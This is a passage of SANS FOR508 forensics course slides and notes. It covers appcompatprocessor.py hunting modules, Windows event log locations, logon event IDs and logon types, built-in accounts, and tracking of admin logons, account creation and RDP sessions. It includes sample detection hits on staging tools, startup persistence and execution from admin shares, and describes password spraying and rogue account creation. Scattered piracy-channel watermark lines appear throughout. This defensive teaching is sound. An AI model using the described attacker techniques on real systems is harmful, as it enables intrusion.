as a zip archive, saving one extra step when moving datasets to your processing system.
The real power of appcompatprocessor.py occurs once ShimCache and Amcache data has been ingested into the
database. The tool has a series of modules allowing different types of analysis, allowing investigators to quickly
find evil and then pivot around those findings to learn more about the attack. The modules use a wide variety of
techniques, including regular expressions, temporal proximity to other executions, and least frequency of
occurrence (stacking). Here are some of our favorite modules:
search: Search the database for regular expression matches. The tool comes with over one hundred
prebuilt regular expressions and can be easily extended via a text file
fsearch: Search using a single database field (FileName, FilePath, Size, LastModified, ExecFlag, etc.)
filehitcount: Simple stack of frequency of each executable found
tcorr: Temporal correlation of execution, finding files that regularly execute either before or after each other
to identify patterns and additional files of interest
reconscan: Search for a collection of common recon tools executed in close proximity to one another
and
create a score for how likely it is each host experienced recon activity (list shows results)
leven: Find slight file name deviations to identify files trying to hide in plain sight with similar names
(i.e.,
svchos.exe, lssass.exe, cssrs.exe, etc.)
stack: Perform least frequency of occurrence using specific database fields
rndsearch: Attempt to identify randomly named files
The variety of different ways to look at application execution data is what really sets this tool apart. As you gain
more experience, you will find yourself pivoting from one view to another, often expanding your view of the
attack each time. Matias Bevilacqua is the creator of appcompatprocessor, and he does a masterful job of walk28

© 2023 SANS Institute

.

28

ing viewers through using the tool in his recorded talk from the SANS Threat Hunting Summit.[2]

.

[1] GitHub for appcompatprocessor.py: https://for508.com/7k3oi
[2] ShimCache and Amcache enterprise-wide hunting talk: https://for508.com/hg6uy

© 2023 SANS Institute

.

29

Scaling Execution Analysis: appcompatprocessor.py (2)

[Root of RarSFX .exe] BASE-WKSTN-01 2018-08-11 15:04:48 0001-01-01 00:00:00
C:\Users\spsql\AppData\Local\Temp\RarSFX0\setup.exe N/A N/A (Ap)
[7zip] BASE-RD-02 2018-05-08 21:12:46 0001-01-01 00:00:00 C:\ProgramData\staging\7za.exe N/A N/A (Ap)
[Startup persistence] BASE-RD-05 2016-07-22 19:18:07 0001-01-01 00:00:00 C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\Startup\bginfo.bat N/A False (Ap)
[Exec from VFS] BASE-RD-04 2018-08-24 15:35:47 0001-01-01 00:00:00 \\172.16.6.16\c$\Windows\Temp\BrowsingHistoryView.exe
N/A N/A (Ap)
[Exec from VFS] BASE-RD-04 2018-08-25 20:49:31 0001-01-01 00:00:00 \\172.16.6.16\c$\Windows\Temp\1.bat N/A N/A (Ap)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In this example, we use appcompatprocessor.py to do a search using its built-in regular expression file. The
name of the file is AppCompatSearch.txt (you can find it on the GitHub page), and it is a robust collection of
signatures designed to find anomalies within ShimCache and Amcache data sets. In this example, it finds a lot
of activity of executions from network shares (the signature marks these “Exec from VFS”), some 7zip activity,
psexec, and sdelete usage, and even hits for possible credential dumpers and the RAR tool. Search results are
written into a file named Output.txt containing one line for each of the findings. The bottom half of the slide
shows the verbose output written into the output file.

30

© 2023 SANS Institute

.

30

.
© 2023 SANS Institute

.

31

Stacking with appcompatprocessor.py

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Here we see appcompatprocessor.py used to perform least frequency of occurrence analysis. The “stack” was
performed on the “FilePath” database field and further refined to only include filenames containing svchost.exe.
We would expect to find svchost.exe in the Windows\System32 folder, and the results show this is the
predominant folder. It looks like it also exists in some .NET folders, but the most interesting finding is a single
system with a matching file name in the C:\ProgramData folder. This item is clearly an outlier and should be
investigated. An “fsearch” regular expression search for “ProgramData” in the path was subsequently
conducted to find the full file name and the system of interest (DESKTOP-33 in this case). Notice how one hit
often leads to others, as the file svc.bat within the folder on that same system could also be related.

32

© 2023 SANS Institute

.

32

.
© 2023 SANS Institute

.

33

Lab 2.1
Evidence of Execution:
Prefetch, ShimCache, and Amcache
Average Time: 45-50 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

34

© 2023 SANS Institute

.

34

Intrusion Analysis Agenda

Advanced Evidence of Execution
Event Log Analysis for Responders and Hunters
Lateral Movement Adversary Tactics
Command Line, PowerShell, and WMI Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

35

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

35

Event Log Analysis for
Responders and Hunters

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

36

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

36

Event Log Overview

Event Log Fundamentals
Analysis Scenarios
Event Log Resources
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

37

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

37

Where to Find Event Logs

NT / Win2000 / XP / Server 2003
• .evt file type
• %systemroot%\System32\config
• Filenames: SecEvent.evt, AppEvent.evt, SysEvent.evt

Vista / Win7 / Win8 / Win10 / Win11
• .evtx file type
• %systemroot%\System32\winevt\logs
• Remote log server
• Filenames: Security.evtx, Application.evtx, System.evtx, etc.

Default locations can be changed in the registry
FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

.

Event logs, as we know them today, originated with the NT 3.1 operating system in 1993.[1] Small upgrades were
seen throughout the Windows NT evolution, but the names and locations of logs largely remained unchanged
through Windows 2003. This original log format used the .evt extension. Logs are stored in binary format,
complicating byte-level string searching, and are implemented using a circular buffer. The circular buffer loops
around to (eventually) overwrite the oldest entries to the most recent. Event logs prior to Vista can be found in:
%systemroot%\System32\config

Starting with the Vista and Server 2008 product lines, significant changes to the event log structures, log types,
and log locations were made. Event logs have historically exacted a huge performance drain on systems and
hence the new format, using the .evtx extension, was created to fix this and many other problems. The good news
is that with the new optimizations, we are more likely to find event logs being used on the newest operating
systems. In addition to radical changes to the event log structures, Vista and above systems now employ a much,
much larger number of logs, and hence a new folder was created to house these 300+ logs. These logs can now be
found in:
%systemroot%\System32\winevt\logs
Additionally, the new log format (finally) allows logs to be sent to a remote log collector; so, it is important to
remember that additional logs may be available on external servers.
It is important to note that the folders listed here are only the default locations. The administrator can designate
locations for individual logs within the following registry keys:
HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application
HKLM\SYSTEM\CurrentControlSet\Services\EventLog\System
HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security

38

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

38

There are three options when the maximum size of a log is reached:
• Overwrite events as needed (Default): Events in the log are overwritten when the maximum file size is
reached.
• Archive the log when full; do not overwrite events: When the log is full, an archive is created (look for
files named “Archive-Security-<Date>”). If not watched, this has the potential to fill the drive to capacity.
• Do not overwrite events: When the max log size is reached, error messages are generated to indicate that
the event log is full. The administrator must manually clear the logs.

.

[1] Event Viewer – Wikipedia: http://for508.com/1kf3q

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

39

Types of Event Logs
Security

• Records access control and security settings
• Events based on audit and group policies
• Example: Failed logon; folder access

System

• Contains events related to Windows services,
system components, drivers, resources, etc.
• Example: Service stopped; system rebooted

Application

• Software events unrelated to operating system
• Example: SQL server fails to access a database

Custom

• Custom application logs
• Examples: Task Scheduler, Terminal Services,
PowerShell, WMI, Firewall, DNS (Servers)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Event logging began with three primary logs (Security, System, and Application), and these logs have
maintained their importance throughout all Windows NT platforms. Along the way, additional logs have been
added for specialized logging, which we have grouped here under “custom” logs. Vista, Win7, Server 2008,
Win10, and now Win11 and Server 2022 have greatly expanded the number of custom logs, enforcing log
segmentation and providing specialized logs for processes like PowerShell, Task Scheduler, and the Windows
Firewall. Modern Windows 10 and 11 systems regularly have over 300 logs, over a 100% increase over the
number of logs found in Windows 7! Although the number of logs to review is daunting, it is a spectacularly
good thing for forensics. Specialized logs mean segmented data and a greater likelihood of important
information stored for longer periods without falling prey to the rapid turnover of the Security log. Also, keep in
mind that many of the logs are unused on a typical system. You can tell this immediately by sorting the folder by
file size.
Modern event logs can be broken up into multiple categories:
• Security Log: Records events based on auditing criteria provided by local or global group policies.
• System Log: Records events logged by the operating system or its components, such as the failure of a
service to start during the boot cycle.
• Application Log: Records events logged by applications, such as the failure of MS SQL to access a database
or an antivirus alert.
• Custom: A wide range of specialized logs including PowerShell, Windows Firewall, Task Scheduler, and
those only seen on servers like Directory Service, DNS Server, and File Replication Service logs. Many of
these logs are organized in the event viewer under the Applications and Services category.

40

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

40

Security Log

• Most reviewed log in Windows forensics
• User authentication and logon
• User behavior and actions
• File/Folder/Share access
• Security settings modifications

• Failure and success can be audited
• Detailed logging can be enabled on specific user accounts

• Only updated by the LSASS process
• Third-party applications cannot insert events
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

41

.

Although almost all event logging has the potential to be useful during an investigation, most of the questions
we are looking to answer during a forensic investigation tend toward answers found in the Security log. The
System and Application logs store information more useful for troubleshooting by system administrators. The
Security log records an audit event whenever a given system or user action meets the criteria set forth by the
audit policy in use. They can provide details on a variety of actions, including user authentication (logons, runas
command, remote access, etc.) and what a particular user did on a system after authentication. As an example,
privilege use and object auditing can trigger events showing that a protected file or folder was accessed, which
user account accessed it, and the date and time it occurred. Auditing is also allowed on the security settings
themselves, providing a good record of any modifications to the existing security policies on the system.
An important concept is that the audit policy can be set to trigger events for both successful and failed attempts.
This allows for a finer granularity of auditing and provides tailored data reduction—only recording the exact
actions that a security administrator finds useful in his or her environment. As forensic analysts, we would love
to have everything logged, but that entails a performance and storage hit that is not possible in many
environments. That being said, audit policy should be vetted because it is not always obvious to a non-security
professional why something like Successful AND Failed logon attempts should be logged (the former could
allow us to track a compromised account being used throughout the environment, whereas the latter could
indicate password guessing attacks). Keep in mind that it is possible to tailor auditing for a specific user account
using Group Policy. Thus, if you suspect a specific account has been compromised by an intruder, or you would
like more detailed auditing on critical accounts like administrators, Group Policy can provide that capability on a
per-account basis.
Due to its nature, the Security log has more protections in place than the System and Application logs. With XP
SP2, the API was deprecated for applications other than the Windows Security Service to trigger events in the
Security log. This ability is now held only by the Local Security Authority Subsystem Service (LSASS) because
it is responsible for enforcing the security policy on the system. Additionally, only user accounts with
administrator permissions can review, export, or clear the log.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

41

What Is Recorded? Security Event Categories
Account Logon

Events stored on system that authorized logon (that is, domain
controller or local system for non-domain accounts)

Account Mgmt

Account maintenance and modifications

Directory Service

Attempted access of Active Directory objects

Logon Events

Each instance of logon/logoff on local system

Object Access

Access to objects identified in system access control list

Policy Change

Change of user rights, audit policies, or trust policies

Privilege Use

Each case of an account exercising a user right

Process Tracking

Process start, exit, handles, object access, etc.

System Events

System start and shutdown; actions affecting security log
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Security event categories give us a quick means to identify event log entries that might be of interest to our
investigation. They follow directly from the enabled audit policies on a Windows system. For each of these
categories, the audit policy can be set to No Auditing, Success, Failure, or both Success and Failure.

.

When events are triggered and recorded in the logs, they will be marked with the specific category that they
belong to. When auditing is disabled for any given category, we should expect to not see any recorded events of
that type.
From Microsoft TechNet:[1]
• Audit account logon events: Audit each instance of a user logging on to or logging off from another
computer in which this computer is used to validate the account.
• Audit account management: Audit each event of account management on a computer. Examples of account
maintenance include password changes, user account, and group modifications.
• Audit directory service access: Audit the event of a user accessing an Active Directory object that has its
own system access control list (SACL) specified.
• Audit logon events: Audit each instance of a user logging on or logging off a computer. Note that this is
different than the “Audit account logon events” category. This tracks the logon event to a specific server; the
former tracks which domain controller authenticated the user.
• Audit object access: Audit the event of a user accessing an object that has its own system access control list
(SACL) specified. Examples of objects are files, folders, registry keys, printers, etc.
• Audit policy change: Audit every incident of a change to user rights assignment policies, audit policies, or
trust policies.
•
42

Audit privilege use: Audit each instance of a user exercising a user right.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

42

• Audit process tracking: Audit detailed tracking information for events such as program activation,
process exit, handle duplication, and indirect object access.
• Audit system events: Audit when a user restarts or shuts down the computer or when an event occurs that
affects either the system security or the security log.

.

[1] Audit Policy: http://for508.com/4dfe3

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

43

Event Log Overview

Event Log Fundamentals
Analysis Scenarios
Event Log Resources
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

44

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

44

Analysis Scenarios

Profiling Account Usage
Tracking Lateral Movement
Suspicious Services
Event Log Clearing
Malware Execution and Process Tracking
Capturing Command Lines and Scripts
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

45

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

45

Tracking Account Usage (1)

Scenario
• Determine which accounts have been used for attempted logons
• Track account usage for known compromised accounts

Relevant Event IDs
• 4624: Successful Logon
• 4625: Failed Logon
• 4634/4647: Successful Logoff
• 4648: Logon using explicit credentials (RunAs)
• 4672: Account logon with superuser rights (Administrator)
• 4720 / 4726: An account was created / deleted

Investigative Notes

•Security log
• Windows does not reliably record logoffs (ID 4634), so also look for ID 4647 → userinitiated logoff for interactive logons
• Logon events not recorded when backdoors, remote exploits, or similar malicious means
are used to access a system
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Tracking account usage is one of the more common uses for reviewing event logs. Knowing when a user
account logged on to a system and subsequently logged off can provide helpful corroborating evidence along
with other forensic artifacts found. If account credentials are suspected to be compromised, reviewing successful
logons throughout your network can help track where the hacker has been. We will also see that remote logons
are recorded and can provide excellent profiling information on how an authorized or unauthorized user is
traversing the network and attempting to authenticate with resources.
With the introduction of Win2008, account usage Event ID Codes were collapsed into only a handful of
possibilities (in comparison, XP had 24 Event IDs for logon actions). The most common are the 4624/4634 pair,
which shows a successful logon/logoff, as well as the time period of the complete user session. Windows is not
always consistent with recording logoff events (type 4634), so it is wise to also look for 4647 events (userinitiated logoff for interactive and remote interactive sessions). 4625 events indicate logon failures and are often
reviewed for evidence of password guessing attacks. When explicit (different) credentials are used, an ID 4648
event is recorded. A good example of this is the runas command, or if an application is run as an administrator,
and those admin credentials are entered by the user. Event ID 4672 is recorded for administrator-equivalent
logons in addition to the standard 4624 event. Finally, event ID 4720 is recorded whenever a new account is
created and 4726 recorded for account deletion. The IDs covered on this slide are triggered by a mix of Success
and Failure audits. They can be used for justifying the inclusion of both Success and Failure into your Logon
Events Audit Policy.
When a hacker gains access to a system through some exploits (remote code execution, service exploitation,
client-side attacks resulting in backdoors, etc.), there is typically no record of “logon” within the event logs. This
is intuitive because a backchannel is being used and the standard APIs for access are being circumvented.
However true remote exploits are quite rare, and in most situations administrative account usage is still typically
required for lateral movement to the system and things like code installation, providing at least initial logging of
the attack.
Corresponding event IDs in Windows XP/2003: 528-552

46

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

46

Tracking Account Usage (2)

• Event ID
• Account
• Logon Type
• Timestamp
• Computer
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

47

We will be reviewing logs in this section using the built-in Event Viewer tool. It can be opened via the Run
command bar or command line using its filename, eventvwr.exe. Alternatively, it can be accessed via the
Computer Management Microsoft Management Console (MMC)—right-click My Computer in the Start menu
and select Manage.

.

Each record shown in the Event Viewer can be expanded for additional information. When auditing account
usage events, we focus on five fields of the event record. Our preliminary information comes from the footer.
There we find the timestamp information, providing the date and time that the account logon occurred. The
Computer reference tells us the hostname of the system that the event was recorded on. This can be very helpful
when reviewing logs from multiple systems simultaneously to find logon patterns. Finally, the Event ID tells us
what type of Logon/Logoff event this is, and in this case, it is Event ID 4624, which is reserved for successful
logons. An excellent reference for a wide range of Event IDs is the following website:
•

http://www.ultimatewindowssecurity.com/securitylog/encyclopedia/

We can gather further details within the Event Description. Most notably, the Account Name field tells us which
account was successfully logged into. In this case, it was an account named “rsydow”. The Logon Type field is
easy to ignore but plays a very important role in tracking account usage. There are multiple different ways that a
logon can occur in a modern Windows system. It isn’t enough to just tell us that the Administrator account
successfully logged in to this system at 11:52:56 AM on 5/30/2021. We would also like to know whether they
were using the console, logging in via some network protocol like SMB, or using Remote Desktop. The Logon
Type can give us this further information. In this case, Logon Type 2 indicates that the logon was accomplished
via a console.
It is important to note that we usually don’t just rely on one event. After gathering information from this 4624
event, we would then review other events surrounding it in addition to looking for a matching 4634 event,
indicating that the user logged off from this session.
Although these are the most important elements, each recorded event contains additional information defining
the event and providing valuable information regarding why that event was triggered.[1] In this slide, we are
showing these elements using the detailed Event Properties function of the Event Viewer. However, it is
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

47

important to note that the elements are all stored in an XML format and can be parsed and displayed using a
variety of tools. The information available is as follows:
•

Logged: The timestamp of when the event was triggered. Displayed in Local System Time.

•

Level: Provides the reason the event was triggered and in some cases its severity.

•

User: The account that triggered the event.

• Computer: The name of the computer where the event occurred (useful when reviewing logs from
different systems simultaneously).
•

Source: The application, service, or Microsoft component that logged the event.

• Task Category: The category of the event; in Security logs, this will be the Security Event Category
managed via the audit policy.
• Event ID: A unique code assigned to various system functions. Can often be the most useful indicator of
what triggered the event (if you have a good Event ID reference).
• General Description: A canned text description of the event, sometimes with additional information.
Descriptions can excel at “saying nothing”, but can sometimes provide valuable information, including
remote IP addresses, hostnames, etc.
•

Details: An optional field that can contain additional raw data (or error codes) generated by the event.

.

[1] Event Logging and Viewing: http://for508.com/-g1h6

48

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

.ir
01
de
hi
© 2023 SANS Institute

.

49

Logon Type Codes
Logon Type
Code

Explanation

2

Log on via console (keyboard, server KVM, or virtual client)

3

Network logon (SMB and some RDP connections)

4

Batch Logon—Often used by Scheduled Tasks

5

Windows Service Logon

7

Credentials used to lock or unlock screen; RDP session reconnect

8

Network logon sending credentials in cleartext

9

Different credentials used than logged on user — RunAs/netonly

10

Remote interactive logon (Remote Desktop Protocol)

11

Cached credentials used to log on

12

Cached Remote Interactive (similar to Type 10)

13

Cached unlock (similar to Type 7)
FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

.

Logon Events can give us very specific information regarding the nature of account authorizations on a system
if we know where to look and how to decipher the data that we find. In addition to telling us the date, time,
username, hostname, and success/failure status of a logon, we can also determine by exactly what means a logon
was attempted. Logon Type Events are provided within the “Description” information of Logon Events and can
give us this further information about how a logon was attempted. This information can be exceedingly helpful
to an investigation, allowing us to determine whether an actual “hands-on keyboard” was used to log on or
whether the session was created using remote means via a Server Messaging Block (SMB) protocol connection
or by using something like Remote Desktop. Further, we can use this information to differentiate between
system-based logons, such as those performed by Scheduled Tasks, and user-based interactive logons.
The following Logon Type Codes can be used:[1]
2: Log on via a console (keyboard, server KVM, or virtual client like VNC)
3: Network logon (often using something like SMB for drive mapping, though also used for RDP with Network
Level Authentication (NLA)
4: Batch logon (Scheduled Tasks)—non-interactive
5: Windows Service Logon—non-interactive
7: Lock or unlock of screen (reconnecting to an existing RDP session can also use this Logon Type)
8: Network logon sending credentials in cleartext (potentially indicative of a downgrade attack or older admin
tool)
9: Different credentials used to authenticate other than those currently logged on with (“RunAs /netonly”
command or similar)
10: Remote interactive logon (Terminal Services/Remote Desktop Protocol)
11: Cached credentials used to log on instead of domain controller authentication
12: Cached credentials used for a remote interactive logon (RDP). Previously rare, but now being seen when
Microsoft “live” accounts are used for authentication on standalone workstations
13: Cached credentials used for an unlock operation

50

© 2023 SANS Institute

.

50

In addition to helping our investigations, knowing these Logon Types can also be an excellent way to filter and
audit security within your enterprise. For instance, if you see Logon Type 10 in your event logs, this indicates
remote desktop is in use. That might be normal for a terminal server, but on something like a workstation, it
could be indicative of suspicious activity.

.

[1] Logon Type Codes Revealed: http://for508.com/0b4vz

© 2023 SANS Institute

.

51

Identifying Logon Sessions

Use the Logon
ID value to link
a logon with a
logoff and
determine
session length
Session time =
~ 19 hours

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Each account session is assigned a unique Logon ID at the time of logon. This value can be exceedingly helpful
for tracking user activities during that session. Examiners are often called on to determine the length of time a
user spent on the system. This can be used to profile account usage, as part of a damage assessment in an
intrusion case, or even for things like timecard violations. In this slide, we have two events: a 4624 successful
logon and a 4647 user-initiated logoff. The Logon ID allows us to tie the two events together and determine the
amount of time the user was logged in during this session. In this case, the initial logon occurred at 1:11:38 PM
and the user logged off the next day at 8:12:10 AM, giving a total session time of approximately 19 hours. Keep
in mind that 4634 successful logoff events can also be used in place of 4647 events when they exist.
Determining session length is most useful for interactive (Type 2,10,11,12) logons. Other logon types like batch
and network (Type 3,5) tend to connect for only short periods. As an example, if a user opens a document from
a remote share, a Type 3 logon and logoff will be generated even if the user still has the document open. If
changes are made and subsequently saved to the document, another Type 3 session will be initiated.
In addition to determining the session length, the Logon ID can also tie together other actions like special user
privileges assigned to the session, process tracking and object access events, and granular views of user activity
like screen locking and unlocking (recorded as Type 7 4624/4634 events as well as 4800/4801 events). The
Linked Logon ID value arrived in Windows 10 and ties the session to the Logon ID of any other authentication
events. As an example, admin logins generate two different sessions: a high privilege session and a lower
privilege session. Non-admin sessions typically have this value zeroed out. One other interesting note about this
example is shown in the Account Domain field of the 4624 event. Notice it is marked as using a Microsoft
Account. Microsoft Accounts, also known as cloud or live accounts, are increasingly in use on modern
Windows implementations and are tied to Microsoft online account names (“fred.rocba@outlook.com” in this
example). A standard account name is also assigned to the online account as seen in the EID 4647 event using
the account name “fredr”. Windows events can use these two different account names interchangeably, which
means you will need to be careful when filtering to include both representations!
Corresponding event IDs in Windows XP/2003: 528, 538, 551

52

© 2023 SANS Institute

.

52

.
© 2023 SANS Institute

.

53

Tracking Account Usage: Brute Force Password Attack
Evidence of a network-based (Logon Type 3) password spray attack
from multiple sources

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In this slide, we show another reason for tracking account usage. In this case, our review of the event logs shows
a large number of 4625 Events, indicating failed logon attempts. Looking at the event properties tells us that the
failed attempts are for many different accounts, accomplished over the network (Logon Type 3) within seconds
of one another. The speed of logon requests indicates an automated attack (this system received over 5250
attempts per hour resulting in millions of failed logons). Event logs starting with Windows 2003 show both the
hostname AND the IP address, which is helpful here since the hostname information appears to be rotating
while the IP used is largely static (it is also not unusual for vulnerable system to be under attack from multiple
unrelated sources or for a botnet to rotate IP addresses). The failure code information is useful to understand
why each request was denied. Notice that failure code C0000064 indicates an unknown user while the attempts
on the ADMINISTRATOR account received a failure code of C000006A because a bad password was tried on
an existing account. Microsoft has documented the possible status codes and we will see some of the most
important in an upcoming slide.[1]
While logon type 3 events typically indicate the SMB protocol you might also find them recorded for RDP due
to Network Level Authentication (the attack shown here was likely an RDP brute force password spray attack).
[1] Microsoft Docs 4625 An Account Failed to Log On: https://for508.com/03gzk
Corresponding event IDs in Windows XP/2003: 529

54

© 2023 SANS Institute

.

54

.
© 2023 SANS Institute

.

55

Built-In Accounts

You will often see special Windows accounts in event logs
SYSTEM

Most powerful local account; unlimited access to system

LOCAL SERVICE

Limited privileges similar to authenticated user account; can access only
network resources via null session

NETWORK SERVICE

Slightly higher privileges than LOCAL SERVICE; can access network
resources similar to authenticated user account

<Hostname>$

Every domain-joined Windows system has a computer account

DWM

Desktop window manager\Window manager group

UMFD

Font driver host account

ANONYMOUS LOGON

Null session w/o credentials used to authenticate with resource

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

When reviewing event logs, it can be confusing or disconcerting to see users listed other than standard user
account names. By design, every process and service within Windows must run using an account with some
associated security privileges. Because many Windows processes run before a user is even logged on (that is,
boot time), or without explicit user knowledge (system maintenance processes), Windows has a set of service
accounts that can be used to allow processes to run within different security contexts.[1, 2]
• SYSTEM: Prior to Windows 2003, this was the primary account used for non-user related actions. The
problem was that this was the most powerful account on the system and hence any process running under its
authority that was subverted by an attacker would give absolute access to that attacker. Hence, as part of the
Microsoft Trustworthy Computing Initiative, more limited accounts were added, which were more in line
with the security principal of least privilege.
• LOCAL SERVICE: Designed to have limited privileges (similar to the standard USER account) and used
for services that do not require network access. Hence, it has no ability to authenticate with network
resources and is relegated to using null sessions for network communications.
• NETWORK SERVICE: Similar to LOCAL SERVICE, but with slightly higher privileges, which allow it to
impersonate standard computer accounts and authenticate over the network. It is assigned for processes or
services that require network access.
• <Hostname>$: Every domain-joined Windows system has a computer account. The account provides the
means for the computer to be authenticated when communicating with Active Directory and accessing
network and domain resources. The account is named according to the system name and must contain the
dollar sign symbol “$” at the end.
• DWM and UMFD: Microsoft has provided almost no documentation on these built-in accounts that recently
have become much more prevalent. They are apparently related to the windows manager (DWM) and driver
activity (UMFD), but more information is needed.

56

© 2023 SANS Institute

.

56

• ANONYMOUS LOGON: This account is the most often misunderstood. It was originally created as a
means for Windows systems to communicate without requiring explicit credentials. In older or insecure
systems, anonymous logons, or Null Sessions, can be used to enumerate account information, security
policy, registry data, and network shares. These abilities have slowly been removed (by default) in newer
versions of Windows starting with XP and 2003. That being said, the account is still commonly used by
Windows networks to facilitate things like file and print sharing and maintaining the network browse list. If
these services are present in your environment, there is a good chance that you will see Anonymous Logon
usage. The key takeaway is to not automatically assume the system has been under some sort of
enumeration attack. Further contextual information is usually needed to understand what an Anonymous
Logon might mean.
The example shown in the slide shows the successful “logons” of many built-in accounts in use in close
proximity to a user logon (rsydow is a user account on the system). In fact, built-in account logons typically far
outnumber those of normal users. This example shows how noisy these accounts can be in the log, even using
different logon types, like 2, 3, and 5. Since we are typically more interested in what humans are doing on the
system, we can filter out many of these system accounts to better focus on actual user accounts.

.

[1] Securing Critical and Service Accounts: http://for508.com/cest9
[2] Special Identities: http://for508.com/b5-8x

© 2023 SANS Institute

.

57

Tracking Administrator Account Activity

A tool was run as an
administrator
account (using
explicit credentials)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Tracking superuser account activity can be an excellent means for discovering anomalous activity. At some
point during an intrusion, the adversary will need to achieve at least administrative privileges to gather
credentials and effectively move through the enterprise. Thus, auditing and managing these accounts is a critical
choke point that can identify even the most advanced adversaries. When an account assigned privileges
associated with an administrator logs on, an event ID 4672 is recorded. Note that the account technically does
not have to be a full administrator—assignment of privileges like SeTakeOwnership, SeDebug, and
SeImpersonate are all admin-equivalent and will trigger this event.
In this example, we see a successful logon event (ID 4624) immediately followed by a “special logon” event ID
4672, indicating the rsydow-a account has been assigned administrator-level privileges. The combination of
these two events is necessary to prove an admin-level account logged in to this system (alternatively, one could
check the account privileges in the SAM or Active Directory if the account still exists).
This event type is particularly interesting on systems where administrative logins are rare. It can also be a way to
identify highly privileged accounts like service accounts (useful for account auditing, planning for password
resets, and identifying compromised service accounts). Scheduled tasks run with administrative or “highest
privileges” will also trigger this event type. Finally, like many other types of events, you will see plenty of noise
when focused on this event type. As an example, local SYSTEM account activity will be regularly recorded
with this event, as well as machine account activity commonly seen in Active Directory environments.
Corresponding event IDs in Windows XP/2003: 576

58

© 2023 SANS Institute

.

58

.ir
01
de
hi
© 2023 SANS Institute

.

59

Auditing Account Creation

A local account named
“root” was successfully
created using the
“rsydow-a” account. Note
the other nearby events
showing group and
account additions

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

hi

de

Once an adversary has administrator privileges, they can easily create additional accounts. Local administrators
have the ability to create local accounts, and domain administrators can create domain-wide accounts of nearly
any type. While less common today due to the popularity of pass-the-hash and ticket-based attacks, rogue
accounts are still a very viable way to evade some auditing and create “sleeper” accounts that can be used by
attackers in times of distress. Luckily, detecting account creation is very easy via proper auditing of account
management events. Event ID 4720 is recorded when an account is created. In addition to the date and time and
computer it was created on, we also get the account used to authorize the creation and various account details.
The same event is used for both local and domain account creation.
In this slide, we see an ID 4720 event identifying a local account named “root” that was created using the
credentials of an account named “rsydow-a”. From this single event, we do not know the privileges of the new
account. However, by reviewing the events around it, we can see that a subsequent 4732 event—a member was
added to a security-enabled local group—is contemporaneous. A review of this event can tell us which group
(such as the “Administrators” group) the account was made a member of.
Complementary events to this include:
4722: A user account was enabled
4724: An attempt was made to reset an account’s password
4728: A member was added to a security-enabled global group
4732: A member was added to a security-enabled local group
4735: A security-enabled local group was changed
4738: A user account was changed
4756: A member was added to a security-enabled universal group
Corresponding event IDs in Windows XP/2003: 624

60

© 2023 SANS Institute

.

60

.
© 2023 SANS Institute

.

61

Tracking Account Usage: Remote Desktop Protocol (1)

Scenario
• Track Remote Desktop Protocol sessions

Relevant Event IDs
• 4778: Session Reconnected
• 4779: Session Disconnected

Investigative Notes
• Security log
• Records client name and IP address of remote machine making the
connection (sent via RDP client application)
• Not a reliable indicator of all RDP activity—intended to record “reconnects”
• Valuable to fill in gaps since RDP reconnects are often “Type 7” logons
• Also used to track “Fast User Switching” sessions
• The auxiliary logs Remote Desktop Services—RDPCoreTS and
TerminalServices-RdpClient record complementary info
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In addition to the standard logon event ID codes, there are some specialized event IDs that are specifically tied
to the Remote Desktop Protocol (RDP). RDP is used extensively within many enterprises and as such is often
also used by those with malintent. Why install sophisticated backdoors when a Domain Administrator account
can allow you remote access to any system in the Active Directory Forest? (This can be limited by group policy,
but rarely is.) When piecing together evidence of RDP connections, two event IDs can provide significant value:
ID 4778 indicates that an RDP session was reconnected, and ID 4779 indicates that a remote session was
